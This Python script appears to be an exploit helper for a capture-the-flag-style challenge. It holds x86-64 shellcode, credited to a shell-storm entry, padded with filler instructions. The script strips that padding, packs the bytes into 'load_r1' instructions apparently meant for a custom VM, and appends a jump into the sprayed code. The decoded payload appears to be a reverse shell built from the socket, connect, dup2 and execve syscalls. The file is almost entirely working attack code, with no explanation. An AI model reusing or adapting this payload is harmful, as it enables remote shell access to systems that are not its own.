# based on https://shell-storm.org/shellcode/files/shellcode-907.html
import struct

shellcode = b"\x4c\x89\xe0\xf6\x48\xc7\xc0\xb1\x6e\x3d"
shellcode += b"\x00\x48\xc7\xc0\xb5\x69\x3d\x00\x48\xc7"
shellcode += b"\xc0\x0f\xc9\x3d\x00\x48\xc7\xc0\xb1\x2f"
shellcode += b"\x3d\x00\x48\xc7\xc0\xb5\x62\x3d\x00\x48"
shellcode += b"\xc7\xc0\xb2\x2f\x3d\x00\x48\xc7\xc0\xb6"
shellcode += b"\x2f\x3d\x00\x48\xc7\xc0\x0f\xca\x3d\x00"
shellcode += b"\x48\xc7\xc0\xb2\x68\x3d\x00\x48\xc7\xc0"
shellcode += b"\xb6\x73\x3d\x00\x48\xc7\xc0\x48\x0f\xca"
shellcode += b"\xf6\x48\xc7\xc0\x48\x01\xca\xf6\x48\xc7"
shellcode += b"\xc0\x52\x90\x3d\x00\x48\xc7\xc0\xb1\x5c"
shellcode += b"\x3d\x00\x48\xc7\xc0\xb5\x11\x3d\x00\x48"
shellcode += b"\xc7\xc0\x0f\xc9\x3d\x00\x48\xc7\xc0\xb1"
shellcode += b"\x02\x3d\x00\x48\xc7\xc0\xb5\x00\x3d\x00"
shellcode += b"\x48\xc7\xc0\xb2\x7f\x3d\x00\x48\xc7\xc0"
shellcode += b"\xb6\x00\x3d\x00\x48\xc7\xc0\x0f\xca\x3d"
shellcode += b"\x00\x48\xc7\xc0\xb2\xf1\x3d\x00\x48\xc7"
shellcode += b"\xc0\xb6\x00\x3d\x00\x48\xc7\xc0\x48\x0f"
shellcode += b"\xca\xf6\x48\xc7\xc0\x48\x01\xca\xf6\x48"
shellcode += b"\xc7\xc0\x31\xdb\x3d\x00\x48\xc7\xc0\xb3"
shellcode += b"\xf0\x3d\x00\x48\xc7\xc0\x48\x0f\xcb\xf6"
shellcode += b"\x48\xc7\xc0\x48\x31\xda\xf6\x48\xc7\xc0"
shellcode += b"\x52\x90\x3d\x00\x48\xc7\xc0\x6a\x29\x3d"
shellcode += b"\x00\x48\xc7\xc0\x58\x99\x3d\x00\x48\xc7"
shellcode += b"\xc0\x6a\x02\x3d\x00\x48\xc7\xc0\x5f\x90"
shellcode += b"\x3d\x00\x48\xc7\xc0\x6a\x01\x3d\x00\x48"
shellcode += b"\xc7\xc0\x5e\x90\x3d\x00\x48\xc7\xc0\x0f"
shellcode += b"\x05\x3d\x00\x48\xc7\xc0\x97\x90\x3d\x00"
shellcode += b"\x48\xc7\xc0\xb0\x2a\xa9\x00\x48\xc7\xc0"
shellcode += b"\x54\x5e\x3d\x00\x48\xc7\xc0\xb2\x10\x3d"
shellcode += b"\x00\x48\xc7\xc0\x0f\x05\x3d\x00\x48\xc7"
shellcode += b"\xc0\x6a\x03\x3d\x00\x48\xc7\xc0\x5e\x90"
shellcode += b"\x3d\x00\x48\xc7\xc0\xb0\x21\x3d\x00\x48"
shellcode += b"\xc7\xc0\xff\xce\x68\x2b\x48\xc7\xc0\x0f"
shellcode += b"\x05\x68\x2b\x48\xc7\xc0\x75\xe9\x68\x2b"
shellcode += b"\x48\xc7\xc0\x59\x59\x3d\x00\x48\xc7\xc0"
shellcode += b"\x59\x59\x3d\x00\x48\xc7\xc0\x59\x59\x3d"
shellcode += b"\x00\x48\xc7\xc0\x59\x59\x3d\x00\x48\xc7"
shellcode += b"\xc0\x59\x90\x3d\x00\x48\xc7\xc0\x99\x90"
shellcode += b"\x3d\x00\x48\xc7\xc0\xb0\x3b\x3d\x00\x48"
shellcode += b"\xc7\xc0\x52\x51\x3d\x00\x48\xc7\xc0\x54"
shellcode += b"\x5f\x3d\x00\x48\xc7\xc0\x0f\x05\x3d\x00"
shellcode += b"\x48\xc7\xc0"

shellcode = b"".join(shellcode.split(b"\x48\xc7\xc0"))
print(shellcode.hex().upper())
print(len(shellcode) / 4)
# Pad the shellcode with null bytes if its length is not a multiple of 4
if len(shellcode) % 4 != 0:
    exit(777)
    shellcode += b'\x00' * (4 - len(shellcode) % 4)

uint32_sequence = '\n'.join(
    ['load_r1 ' + str(struct.unpack('<I', shellcode[i:i + 4])[0]) for i in range(0, len(shellcode), 4)])
print(uint32_sequence)

# last bytes = e9 XX fe ff ff c9 eb f8

last = str(struct.unpack('<Q', bytes.fromhex("e9 5e fe ff ff c9 eb f8"))[0])
print('load_r1 ' + last)
